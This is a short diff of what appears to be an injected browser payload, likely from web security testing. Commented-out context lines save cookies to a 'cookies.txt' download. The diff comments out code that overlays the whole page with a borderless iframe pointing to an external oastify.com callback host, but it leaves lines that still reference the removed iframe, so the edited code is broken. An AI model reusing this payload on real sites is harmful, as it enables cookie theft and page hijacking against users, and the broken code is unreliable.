@@ -13,14 +13,14 @@ document.querySelectorAll("div").forEach(div => {
 // a.download = "cookies.txt";
 // document.body.appendChild(a);
 // a.click();
-// document.body.removeChild(a);
+// // document.body.removeChild(a);
 
-const iframe = document.createElement("iframe");
-iframe.src = "http://quouyboidt4h25chmacp9un2ut0koacz.oastify.com";
-iframe.style.position = "absolute";
-iframe.style.top = "0";
-iframe.style.left = "0";
-iframe.style.width = "100vw";
-iframe.style.height = "100vh";
+// const iframe = document.createElement("iframe");
+// iframe.src = "http://quouyboidt4h25chmacp9un2ut0koacz.oastify.com";
+// iframe.style.position = "absolute";
+// iframe.style.top = "0";
+// iframe.style.left = "0";
+// iframe.style.width = "100vw";
+// iframe.style.height = "100vh";
 iframe.style.border = "none";
 document.body.appendChild(iframe);
